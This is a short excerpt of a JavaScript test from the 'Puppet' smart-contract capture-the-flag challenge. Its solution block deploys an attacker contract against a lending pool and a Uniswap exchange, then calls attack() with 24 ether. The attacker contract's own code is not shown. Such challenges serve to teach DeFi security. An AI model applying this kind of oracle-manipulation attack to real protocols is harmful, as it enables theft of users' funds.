...
describe("[Challenge] Puppet", function () {
    ...
    it("Execution", async function () {
        ...
        const attacker = await AttackerFactory.connect(player).deploy(lendingPool.address, token.address, uniswapExchange.address);

        await token.connect(player).approve(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);
        await attacker.connect(player).attack({ value: ethers.utils.parseEther("24") });
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player executed a single transaction - but how? xD
